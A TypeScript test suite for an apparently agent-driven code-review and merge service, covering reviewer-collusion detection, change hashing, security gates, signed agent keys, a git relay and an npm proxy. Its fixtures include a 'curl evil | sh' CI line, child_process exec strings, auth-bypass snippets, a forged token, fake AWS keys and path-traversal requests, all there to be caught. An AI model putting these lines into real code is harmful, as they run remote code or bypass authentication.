import { describe, expect, it } from 'vitest';
import aimpWasm from '../crates/aimp-wasm/pkg/aimp_wasm_bg.wasm';
import { isoExpiry, MockArtifacts } from '../src/artifacts/client';
import { REGISTRY_HOST, registryUpstream } from '../src/testing/registry-proxy';
import { parseTestConfig } from '../src/testing/runner';
import { applyEvent, baseRepoOf, emptyGuard, parseArtifactsEvent, recordLanded, recordOwnToken } from '../src/guard';
import { issueAgentKey, secretEquals, verifyAgentKey } from '../src/auth';
import { AimpEngine } from '../src/epistemic/aimp';
import { canonicalChange, lineDiff, lineMultisetDiff, type FileChange } from '../src/epistemic/changeset';
import { collusionCluster, collusiveReviewers, stronglyConnectedComponents } from '../src/epistemic/collusion';
import { runGates } from '../src/gates';
import { changedPaths, computeChanges, DiffLimitError, isAncestor, type ObjectReader } from '../src/git/diff';
import { composeTree, makeTree, type TreeItem } from '../src/git/objects';
import { readJson, ValidationError } from '../src/validation';
import { concatBytes, extractPack, parseReport, pktLine, readPktLines, relayFastForward } from '../src/git/smart-http';

const enc = new TextEncoder();
const dec = new TextDecoder();
const file = (path: string, added: string[], removed: string[] = []): FileChange => ({ path, status: 'modified', binary: false, added, removed });

describe('collusion (Tarjan SCC)', () => {
  it('finds the a->c->b->a cycle that the old DFS missed', () => {
    const comps = stronglyConnectedComponents([
      { from: 'a', to: 'b' },
      { from: 'b', to: 'a' },
      { from: 'a', to: 'c' },
      { from: 'c', to: 'b' },
    ]);
    expect(comps.find((c) => c.length > 1)).toEqual(['a', 'b', 'c']);
  });
  it('returns the author cluster members only', () => {
    const edges = [
      { from: 'x', to: 'y' },
      { from: 'y', to: 'x' },
      { from: 'z', to: 'x' },
    ];
    expect([...collusiveReviewers(edges, 'x')]).toEqual(['y']);
    expect(collusiveReviewers([{ from: 'a', to: 'b' }], 'b').size).toBe(0);
  });
});

describe('changeset + SimHash on changed lines only', () => {
  it('multiset line diff', () => {
    expect(lineMultisetDiff('a\nb\nc', 'a\nc\nd')).toEqual({ added: ['d'], removed: ['b'] });
  });
  it('ordered line diff: a moved line is removed and added, and the hunks show where (a multiset diff shows nothing)', () => {
    const before = ['function del(u) {', '  if (!isAdmin(u)) throw new Error("no");', '  db.delete(u.id);', '}', ''].join('\n');
    const after = ['function del(u) {', '  db.delete(u.id);', '  if (!isAdmin(u)) throw new Error("no");', '}', ''].join('\n');
    expect(lineMultisetDiff(before, after)).toEqual({ added: [], removed: [] });
    const d = lineDiff(before, after);
    expect(d.added).toEqual(['  if (!isAdmin(u)) throw new Error("no");']);
    expect(d.removed).toEqual(['  if (!isAdmin(u)) throw new Error("no");']);
    expect(d.hunks.split('\n')).toEqual(['@@ -1,4 +1,4 @@', ' function del(u) {', '-  if (!isAdmin(u)) throw new Error("no");', '   db.delete(u.id);', '+  if (!isAdmin(u)) throw new Error("no");', ' }']);
  });
  it('the SimHash input does not depend on the alignment: moved lines cancel as in the multiset diff', () => {
    const lines = 'abcdef'.split('');
    for (let i = 0; i < 300; i++) {
      const pick = () => Array.from({ length: (i * 7) % 11 }, (_, j) => lines[(i * 13 + j * j) % 6]).join('\n');
      const [a, b] = [pick(), pick().split('\n').reverse().join('\n')];
      const ordered = lineDiff(a, b);
      const multiset = lineMultisetDiff(a, b);
      expect(canonicalChange([file('f', ordered.added, ordered.removed)])).toBe(canonicalChange([file('f', multiset.added, multiset.removed)]));
    }
  });
  it('opposite fixes sharing context are NOT near-duplicates; reformatting IS identical', async () => {
    const aimp = await AimpEngine.create(aimpWasm);
    const fix = canonicalChange([file('src/auth.ts', ['  const claims = await verifyJwt(token, env.JWT_PUBLIC_KEY, { maxAgeSec: 300 });'], ['  const claims = decode(token);'])]);
    const bypass = canonicalChange([file('src/auth.ts', ['  const claims = { sub: "admin", role: "superuser" }; // TODO re-enable'], ['  const claims = decode(token);'])]);
    const reformatted = canonicalChange([file('src/auth.ts', ['const   claims = await verifyJwt(token,  env.JWT_PUBLIC_KEY, { maxAgeSec: 300 });'], ['const claims =   decode(token);'])]);
    expect(aimp.hammingDistance(aimp.computeSimHash(fix), aimp.computeSimHash(bypass))).toBeGreaterThan(8);
    expect(aimp.hammingDistance(aimp.computeSimHash(fix), aimp.computeSimHash(reformatted))).toBe(0);
  });
  it('unrelated code sits near 128 bits (independent hashes)', async () => {
    const aimp = await AimpEngine.create(aimpWasm);
    const d = aimp.hammingDistance(aimp.computeSimHash('SELECT id FROM users WHERE active = 1;'), aimp.computeSimHash('fn main() { println!("hi"); }'));
    expect(d).toBeGreaterThan(90);
    expect(d).toBeLessThan(166);
  });
});

describe('gates (regressions)', () => {
  const failed = (files: FileChange[]) => runGates(files).filter((g) => !g.passed).map((g) => g.gate);
  it('anonymous functions, removed eval and braces in strings pass', () => {
    expect(failed([file('a.ts', ['const f = function () { return 1; };', 'const s = "{";'], ['return eval(x);'])])).toEqual([]);
  });
  it('dynamic evaluation in added script lines fails, including Function() without new', () => {
    expect(failed([file('a.ts', ['return eval(x);'])])).toContain('dynamic-eval-heuristic');
    expect(failed([file('a.js', ["const g = Function('return this')();"])])).toContain('dynamic-eval-heuristic');
    expect(failed([file('README.md', ['use eval( carefully'])])).toEqual([]);
  });
  it('content a reviewer cannot read: binary data outside image/font/media files fails, symlinks fail, binary strings are scanned', () => {
    const PNG = '89504e470d0a1a0a0000000d49484452';
    const bin = (path: string, strings: string[] = [], status: FileChange['status'] = 'added', magic = PNG): FileChange => ({ path, status, binary: true, added: [], removed: [], strings, magic });
    expect(failed([bin('src/auth.js')])).toContain('binary-content'); // one NUL byte in a comment made it "binary"
    expect(failed([bin('assets/logo.png')])).toEqual([]);
    expect(failed([bin('assets/logo.png', [], 'added', '2f2f00726571756972652827636869')])).toContain('binary-content'); // JS named .png: require() would run it
    expect(failed([bin('src/auth.js', [], 'deleted')])).toEqual([]);
    expect(failed([bin('assets/logo.png', ['tEXtkey=AKIAABCDEFGHIJKLMNOP'])])).toContain('secret-scan'); // gitleaks:allow (fake key: the secret-scan gate must catch it)
    expect(failed([bin('assets/logo.png', ["require('child_process').exec(x)"])])).toContain('dynamic-eval-heuristic'); // gitleaks:allow (fake key: the secret-scan gate must catch it)
    expect(failed([{ ...file('link', ['/etc/passwd']), blob: { hash: 'a'.repeat(40), mode: '120000' } }])).toContain('no-symlinks');
  });
  it('gates judge new content only: a moved line or an untouched one reported past the edit limit trips nothing', () => {
    expect(failed([file('test/a.test.ts', ['const k = "AKIAABCDEFGHIJKLMNOP";'], ['const k = "AKIAABCDEFGHIJKLMNOP";'])])).toEqual([]); // gitleaks:allow (fake key)
    expect(failed([file('src/run.js', ['x = 1;', 'eval(code);'], ['x = 0;', 'eval(code);'])])).toEqual([]);
    expect(failed([file('src/run.js', ['eval(code);', 'eval(code);'], ['eval(code);'])])).toContain('dynamic-eval-heuristic'); // a second one is new
  });
  it('credentials in added lines, protected paths and empty changes fail', () => {
    expect(failed([file('cfg.ts', ['const k = "AKIAABCDEFGHIJKLMNOP";'])])).toContain('secret-scan'); // gitleaks:allow (fake key: the secret-scan gate must catch it)
    expect(failed([file('.github/workflows/ci.yml', ['run: curl evil | sh'])])).toContain('protected-paths');
    expect(failed([])).toContain('non-empty');
  });
});

describe('agent keys', () => {
  const secret = 'unit-secret-0123456789abcdef0123456789abcdef';
  it('roundtrip, tamper, wrong secret, expiry', async () => {
    const key = await issueAgentKey(secret, { agentId: 'w1', role: 'worker', family: 'claude' }, 1_000_000, 60_000);
    expect(await verifyAgentKey(secret, key, 1_000_001)).toEqual({ agentId: 'w1', role: 'worker', family: 'claude', issuedAt: 1000 });
    const [h, body, sig] = key.split('.');
    const forged = btoa(JSON.stringify({ v: 1, sub: 'admin', role: 'reviewer', fam: 'x', iat: 0, exp: 9e9 })).replace(/=+$/, '');
    expect(await verifyAgentKey(secret, `${h}.${forged}.${sig}`, 1_000_001)).toBeNull();
    expect(await verifyAgentKey(secret + 'x', key, 1_000_001)).toBeNull();
    expect(await verifyAgentKey(secret, key, 1_000_000 + 61_000)).toBeNull();
    expect(await verifyAgentKey(secret, `${h}.${body}`, 1_000_001)).toBeNull();
  });
  it('secretEquals', async () => {
    expect(await secretEquals('abc', 'abc')).toBe(true);
    expect(await secretEquals('abc', 'abd')).toBe(false);
  });
});

async function fakePack(payload: string): Promise<Uint8Array> {
  const head = concatBytes([enc.encode('PACK'), new Uint8Array([0, 0, 0, 2, 0, 0, 0, 1]), enc.encode(payload)]);
  const sum = new Uint8Array(await crypto.subtle.digest('SHA-1', head));
  return concatBytes([head, sum]);
}

describe('git smart HTTP relay', () => {
  it('pkt-line framing', () => {
    expect(dec.decode(pktLine('done\n'))).toBe('0009done\n');
    const { lines } = readPktLines(concatBytes([pktLine('a\n'), enc.encode('0000'), pktLine('b\n')]));
    expect(lines.map((l) => (l ? dec.decode(l) : null))).toEqual(['a\n', null, 'b\n']);
    expect(() => readPktLines(enc.encode('zzzz'))).toThrow();
  });
  it('strips the Artifacts trailing flush only when the pack checksum validates', async () => {
    const pack = await fakePack('objects');
    const withFlush = concatBytes([pktLine('ACK abc\n'), pack, enc.encode('0000')]);
    const out = await extractPack(withFlush);
    expect(out.strippedTrailingFlush).toBe(true);
    expect(out.pack).toEqual(pack);
    const corrupt = concatBytes([pktLine('NAK\n'), pack.subarray(0, pack.length - 1), enc.encode('X0000')]);
    await expect(extractPack(corrupt)).rejects.toThrow();
  });
  it('parses side-band and plain reports', () => {
    const inner = concatBytes([pktLine('unpack ok\n'), pktLine('ok refs/heads/main\n'), enc.encode('0000')]);
    const banded = concatBytes([pktLine('\u0001' + dec.decode(inner)), enc.encode('0000')]);
    expect(parseReport(banded)).toEqual(['unpack ok', 'ok refs/heads/main']);
    expect(parseReport(inner)).toEqual(['unpack ok', 'ok refs/heads/main']);
  });
  it('relay: ok, stale (CAS refused) and error outcomes', async () => {
    const pack = await fakePack('x');
    const mk = (report: string[]) =>
      (async (url: RequestInfo | URL) => {
        const u = String(url);
        if (u.endsWith('git-upload-pack')) return new Response(concatBytes([pktLine('ACK a\n'), pack, enc.encode('0000')]));
        return new Response(concatBytes([...report.map((l) => pktLine(l + '\n')), enc.encode('0000')]));
      }) as typeof fetch;
    const base = { forkUrl: 'https://f/x.git', forkReadToken: 't', mainUrl: 'https://m/x.git', mainWriteToken: 't', expectedOld: 'a'.repeat(40), newSha: 'b'.repeat(40) };
    expect((await relayFastForward({ ...base, fetchImpl: mk(['unpack ok', 'ok refs/heads/main']) })).ok).toBe(true);
    expect(await relayFastForward({ ...base, fetchImpl: mk(['unpack ok', 'ng refs/heads/main stale ref']) })).toMatchObject({ ok: false, reason: 'stale' });
    expect(await relayFastForward({ ...base, fetchImpl: mk(['unpack index-pack failed']) })).toMatchObject({ ok: false, reason: 'error' });
  });
});

describe('server-side diff over repository objects', () => {
  it('nested add/modify/delete, ancestry and limits', async () => {
    const m = new MockArtifacts();
    await m.ensureRepo('r');
    const base = await m.commit('r', 'main', { 'src/a.ts': 'one\ntwo\n', 'src/deep/b.ts': 'b\n', 'old.txt': 'bye\n' }, 'base');
    const head = await m.commit('r', 'main', { 'src/a.ts': 'one\nTWO\n', 'src/deep/c.ts': 'new\n', 'old.txt': null }, 'change');
    const reader = m.reader('r');
    const changes = await computeChanges(reader, base, head);
    expect(changes.map((c) => [c.path, c.status])).toEqual([
      ['old.txt', 'deleted'],
      ['src/a.ts', 'modified'],
      ['src/deep/c.ts', 'added'],
    ]);
    expect(changes[1].added).toEqual(['TWO']);
    expect(changes[1].hunks).toBe('@@ -1,2 +1,2 @@\n one\n-two\n+TWO');
    expect(await isAncestor(reader, base, head)).toBe(true);
    expect(await isAncestor(reader, head, base)).toBe(false);
    await expect(computeChanges(reader, base, head, { maxFiles: 1, maxBytes: 1e6 })).rejects.toBeInstanceOf(DiffLimitError);
  });
});

describe('server-side diff: nothing lands unseen', () => {
  it('a NUL byte makes a file binary: no lines, but its printable strings are kept', async () => {
    const m = new MockArtifacts();
    await m.ensureRepo('r');
    const base = await m.commit('r', 'main', { 'src/auth.js': 'export const ok = true;\n' }, 'base');
    const head = await m.commit('r', 'main', { 'src/auth.js': '// \u0000\nexport const isAdmin = () => true; // bypass\n' }, 'nul');
    const [c] = await computeChanges(m.reader('r'), base, head);
    expect(c).toMatchObject({ path: 'src/auth.js', binary: true, added: [], removed: [] });
    expect(c.strings).toContain('export const isAdmin = () => true; // bypass');
    expect(runGates([c]).find((g) => g.gate === 'binary-content')?.passed).toBe(false);
  });
  it('binary strings keep tabs, and a secret past what reviewers are shown is still scanned', async () => {
    const m = new MockArtifacts();
    await m.ensureRepo('r');
    const base = await m.commit('r', 'main', { 'a.txt': 'a\n' }, 'base');
    const filler = Array.from({ length: 600 }, (_, i) => `filler-run-${i}`).join('\u0000');
    const head = await m.commit('r', 'main', { 'logo.png': `\u0000x\trequire(\t'child_process')\u0000${filler}\u0000key=AKIAABCDEFGHIJKLMNOP\u0000` }, 'bin'); // gitleaks:allow (fake key)
    const [c] = (await computeChanges(m.reader('r'), base, head)).filter((x) => x.path === 'logo.png');
    expect(c.strings).toContain("x\trequire(\t'child_process')");
    expect(runGates([c]).filter((g) => !g.passed).map((g) => g.gate)).toEqual(expect.arrayContaining(['binary-content', 'secret-scan', 'dynamic-eval-heuristic']));
  });
  it('removing an accidental NUL byte gives a readable file that passes the binary gate', async () => {
    const m = new MockArtifacts();
    await m.ensureRepo('r');
    const base = await m.commit('r', 'main', { 'src/a.js': 'export const a = 1; // \u0000\n' }, 'base');
    const head = await m.commit('r', 'main', { 'src/a.js': 'export const a = 1;\n' }, 'fix');
    const [c] = await computeChanges(m.reader('r'), base, head);
    expect(c).toMatchObject({ binary: false, added: ['export const a = 1;', ''] });
    expect(runGates([c]).find((g) => g.gate === 'binary-content')?.passed).toBe(true);
  });
  it('a missing final newline is shown as git shows it', () => {
    expect(lineDiff('x', 'x\n').hunks).toBe('@@ -1,1 +1,1 @@\n-x\n\\ No newline at end of file\n+x');
    expect(lineDiff('', 'x\n').hunks).toBe('@@ -0,0 +1,1 @@\n+x');
  });
  it('a mode-only change (same blob) is reported, not skipped', async () => {
    const blob = enc.encode('#!/bin/sh\necho hi\n');
    const trees: Record<string, Array<{ name: string; mode: string; hash: string; type: 'blob' }>> = {
      t1: [{ name: 'run.sh', mode: '100644', hash: 'b1', type: 'blob' }],
      t2: [{ name: 'run.sh', mode: '100755', hash: 'b1', type: 'blob' }],
    };
    const reader: ObjectReader = {
      readCommit: async (h) => ({ hash: h, treeHash: h === 'c1' ? 't1' : 't2', parents: h === 'c2' ? ['c1'] : [] }),
      readTree: async (h) => trees[h] ?? null,
      readBlob: async () => blob,
    };
    const [c] = await computeChanges(reader, 'c1', 'c2');
    expect(c).toMatchObject({ path: 'run.sh', status: 'modified', modeChange: '100644 -> 100755', added: [], removed: [], blob: { hash: 'b1', mode: '100755' } });
    expect([...(await changedPaths(reader, 'c1', 'c2'))]).toEqual(['run.sh']); // a later patch on an older base conflicts, never reverts the mode
  });
  it('the merge queue composes a file replaced by a directory, and a directory replaced by a file', async () => {
    const store = new Map<string, TreeItem[]>();
    const tree = async (items: TreeItem[]) => {
      const t = await makeTree(items);
      store.set(t.hash, items);
      return t.hash;
    };
    const blob = (c: string): TreeItem => ({ name: '', type: 'blob', mode: '100644', hash: c.repeat(40) });
    const read = async (h: string) => store.get(h) ?? null;
    const asFile = await tree([{ ...blob('a'), name: 'lib' }, { ...blob('b'), name: 'x.txt' }]);
    const asDir = await tree([{ name: 'lib', type: 'tree', mode: '40000', hash: await tree([{ ...blob('c'), name: 'index.js' }]) }, { ...blob('b'), name: 'x.txt' }]);
    const toDir = await composeTree(read, asFile, [{ path: 'lib/index.js', blob: { hash: 'c'.repeat(40), mode: '100644' } }, { path: 'lib', blob: null }]);
    expect(toDir.root).toBe(asDir);
    const toFile = await composeTree(read, asDir, [{ path: 'lib', blob: { hash: 'a'.repeat(40), mode: '100644' } }, { path: 'lib/index.js', blob: null }]);
    expect(toFile.root).toBe(asFile);
    await expect(composeTree(read, asDir, [{ path: 'lib', blob: { hash: 'a'.repeat(40), mode: '100644' } }])).rejects.toThrow(/path conflict/); // the directory still holds a file
  });
});

describe('request bodies', () => {
  it('a chunked body with no declared length is cut at the limit, not buffered whole', async () => {
    let pulled = 0;
    const big = new ReadableStream<Uint8Array>({
      pull(c) {
        if (++pulled > 20) return c.close();
        c.enqueue(new Uint8Array(1024).fill(32));
      },
    });
    await expect(readJson(new Request('https://x/', { method: 'POST', body: big, duplex: 'half' } as RequestInit), 4096)).rejects.toBeInstanceOf(ValidationError);
    expect(pulled).toBeLessThan(10); // stopped right after the limit, the rest never read
    expect(await readJson(new Request('https://x/', { method: 'POST', body: '{"a":1}' }), 4096)).toEqual({ a: 1 });
  });
});

describe('isoExpiry (token expiry from the Artifacts binding)', () => {
  it('accepts ISO strings, Dates, unix seconds and milliseconds; falls back to now + TTL', () => {
    const iso = '2026-10-02T18:00:00.000Z';
    const ms = Date.parse(iso);
    expect(isoExpiry(iso, 60)).toBe(iso);
    expect(isoExpiry(new Date(ms), 60)).toBe(iso);
    expect(isoExpiry(ms / 1000, 60)).toBe(iso);
    expect(isoExpiry(ms, 60)).toBe(iso);
    const fallback = Date.parse(isoExpiry('not a date', 60));
    expect(Math.abs(fallback - (Date.now() + 60_000))).toBeLessThan(5_000);
  });
});

describe('collusionCluster (incremental) agrees with Tarjan on every node', () => {
  it('random graphs with cycles, self-loops and dual-role identities', () => {
    let seed = 7;
    const rnd = (n: number) => ((seed = (seed * 1103515245 + 12345) % 2147483648), seed % n);
    for (let g = 0; g < 300; g++) {
      const nodes = 2 + rnd(14);
      const edges: Array<{ from: string; to: string }> = [];
      for (let e = rnd(nodes * 3); e > 0; e--) edges.push({ from: `n${rnd(nodes)}`, to: `n${rnd(nodes)}` });
      const out = new Map<string, Set<string>>();
      const inc = new Map<string, Set<string>>();
      for (const { from, to } of edges) {
        if (!out.has(from)) out.set(from, new Set());
        if (!inc.has(to)) inc.set(to, new Set());
        out.get(from)!.add(to);
        inc.get(to)!.add(from);
      }
      for (let i = 0; i < nodes; i++) {
        const a = `n${i}`;
        expect([...collusionCluster(out, inc, a)].sort(), `graph ${g} node ${a}`).toEqual([...collusiveReviewers(edges, a)].sort());
      }
    }
  });
});

describe('agentRateLimit', () => {
  it('passes without a binding or within budget; 429 with Retry-After when the binding refuses', async () => {
    const { agentRateLimit } = await import('../src/index');
    await expect(agentRateLimit({}, 'a')).resolves.toBeUndefined();
    const keys: string[] = [];
    const limiter = (success: boolean) => ({ limit: async (o: { key: string }) => (keys.push(o.key), { success }) });
    await expect(agentRateLimit({ AGENT_LIMITER: limiter(true) }, 'agent-1')).resolves.toBeUndefined();
    await expect(agentRateLimit({ AGENT_LIMITER: limiter(false) }, 'agent-2')).rejects.toMatchObject({ status: 429, code: 'RATE_LIMITED', headers: { 'Retry-After': '10' } });
    expect(keys).toEqual(['agent-1', 'agent-2']);
  });
});

describe('main guard (src/guard.ts)', () => {
  const ev = (type: string, repo: string, payload: Record<string, unknown> = {}) => ({
    type: `cf.artifacts.repo.${type}`,
    source: { type: 'artifacts.repo', namespace: 'ns', repoName: repo },
    payload,
    metadata: { eventTimestamp: new Date(Date.now() - 1500).toISOString() },
  });
  it('parses event bodies (object or JSON string) and ignores anything else', () => {
    expect(parseArtifactsEvent(ev('pushed', 'r'))?.repo).toBe('r');
    expect(parseArtifactsEvent(JSON.stringify(ev('cloned', 'r')))?.type).toBe('cf.artifacts.repo.cloned');
    expect(parseArtifactsEvent({ type: 'cf.kv.put', source: { repoName: 'r' } })).toBeNull();
    expect(parseArtifactsEvent('not json')).toBeNull();
    expect(parseArtifactsEvent(null)).toBeNull();
  });
  it('maps forks and mirrors to their repository', () => {
    expect(baseRepoOf('demo')).toBe('demo');
    expect(baseRepoOf('demo--a0123456789ab')).toBe('demo');
    expect(baseRepoOf('demo--a0123456789ab-r2')).toBe('demo');
    expect(baseRepoOf('demo--m3')).toBe('demo');
    expect(baseRepoOf('my--repo')).toBe('my--repo');
  });
  it('own pushes and tokens pass; foreign ones raise the first alert; unwatched repos are ignored', () => {
    const g = emptyGuard();
    const watched = new Set(['r']);
    recordLanded(g, 'a'.repeat(40));
    recordOwnToken(g, 'tok-own');
    const now = Date.now();
    expect(applyEvent(g, parseArtifactsEvent(ev('pushed', 'r', { ref: 'refs/heads/main', after: 'a'.repeat(40) }))!, watched, now)).toBeNull();
    expect(applyEvent(g, parseArtifactsEvent(ev('token.created', 'r', { tokenId: 'tok-own', scope: 'write' }))!, watched, now)).toBeNull();
    expect(applyEvent(g, parseArtifactsEvent(ev('token.created', 'r', { tokenId: 'tok-x', scope: 'read' }))!, watched, now)).toBeNull();
    expect(applyEvent(g, parseArtifactsEvent(ev('pushed', 'r--a0123456789ab', { ref: 'refs/heads/main', after: 'f'.repeat(40) }))!, watched, now)).toBeNull();
    expect(g.counts).toMatchObject({ ownPushes: 1, foreignPushes: 0, events: 3 });
    expect(g.counts.maxLagMs).toBeGreaterThanOrEqual(1000);
    const a1 = applyEvent(g, parseArtifactsEvent(ev('token.created', 'r', { tokenId: 'tok-evil', scope: 'write' }))!, watched, now);
    expect(a1?.kind).toBe('foreign-write-token');
    const a2 = applyEvent(g, parseArtifactsEvent(ev('pushed', 'r', { ref: 'refs/heads/main', before: 'a'.repeat(40), after: 'b'.repeat(40), commits: [{ id: 'b'.repeat(40), message: 'evil', author: { email: 'x@y' }, committer: { email: 'x@y' } }] }))!, watched, now);
    expect(a2?.kind).toBe('foreign-push');
    expect(a2?.commits?.[0]).toMatchObject({ author: 'x@y', message: 'evil' });
    expect(g.alert?.kind).toBe('foreign-write-token'); // the first alert is kept
    // A push of one of our own commits to another ref is still a write the queue did not make.
    expect(applyEvent(g, parseArtifactsEvent(ev('pushed', 'r', { ref: 'refs/heads/other', after: 'a'.repeat(40) }))!, watched, now)?.kind).toBe('foreign-push');
    applyEvent(g, parseArtifactsEvent(ev('cloned', 'r'))!, watched, now);
    applyEvent(g, parseArtifactsEvent(ev('fetched', 'r'))!, watched, now);
    expect(g.counts).toMatchObject({ clones: 1, fetches: 1, foreignPushes: 2, foreignWriteTokens: 1 });
    expect(g.recent.length).toBe(g.counts.events);
  });
});

describe('test declaration with a dependency install', () => {
  it('parses install commands and validates them', () => {
    expect(parseTestConfig(JSON.stringify({ test: { commands: ['node --test'] } }))).toEqual({ install: [], commands: ['node --test'], timeoutMs: 300_000 });
    expect(parseTestConfig(JSON.stringify({ test: { install: ['npm ci --ignore-scripts'], commands: ['npm test'], timeoutSec: 120 } }))).toEqual({ install: ['npm ci --ignore-scripts'], commands: ['npm test'], timeoutMs: 120_000 });
    expect(parseTestConfig(JSON.stringify({ test: { install: 'npm ci', commands: ['x'] } }))).toHaveProperty('error');
    expect(parseTestConfig(JSON.stringify({ test: { install: ['a', 'b', 'c', 'd', 'e', 'f'], commands: ['x'] } }))).toHaveProperty('error');
    expect(parseTestConfig(JSON.stringify({ test: { install: [''], commands: ['x'] } }))).toHaveProperty('error');
  });
});

describe('npm registry proxy for the test container', () => {
  const req = (url: string, init: RequestInit = {}) => new Request(url, init);
  it('forwards read-only requests for the internal registry name to registry.npmjs.org, with a header allowlist', () => {
    const up = registryUpstream(req(`http://${REGISTRY_HOST}/ms/-/ms-2.1.3.tgz?x=1`, { headers: { accept: 'application/octet-stream', authorization: 'Bearer leak', cookie: 'c=1', 'npm-command': 'ci' } }));
    expect(up).toBeInstanceOf(Request);
    const r = up as Request;
    expect(r.url).toBe('https://registry.npmjs.org/ms/-/ms-2.1.3.tgz?x=1');
    expect(r.method).toBe('GET');
    expect(r.headers.get('accept')).toBe('application/octet-stream');
    expect(r.headers.get('npm-command')).toBe('ci');
    expect(r.headers.get('authorization')).toBeNull();
    expect(r.headers.get('cookie')).toBeNull();
    expect((registryUpstream(req(`http://${REGISTRY_HOST}/ms`, { method: 'HEAD' })) as Request).method).toBe('HEAD');
  });
  it('refuses writes, other hosts and path tricks', () => {
    for (const method of ['POST', 'PUT', 'DELETE', 'PATCH']) expect((registryUpstream(req(`http://${REGISTRY_HOST}/ms`, { method, body: method === 'DELETE' ? undefined : 'x' })) as Response).status).toBe(405);
    expect((registryUpstream(req('http://evil.example/ms')) as Response).status).toBe(403);
    // Dot segments are resolved by the URL parser before the policy sees them: the request stays on the registry.
    expect((registryUpstream(req(`http://${REGISTRY_HOST}/a/%2e%2e/%2e%2e/etc`)) as Request).url).toBe('https://registry.npmjs.org/etc');
    expect((registryUpstream(req(`http://user:pw@${REGISTRY_HOST}/ms`)) as Response).status).toBe(400);
  });
});
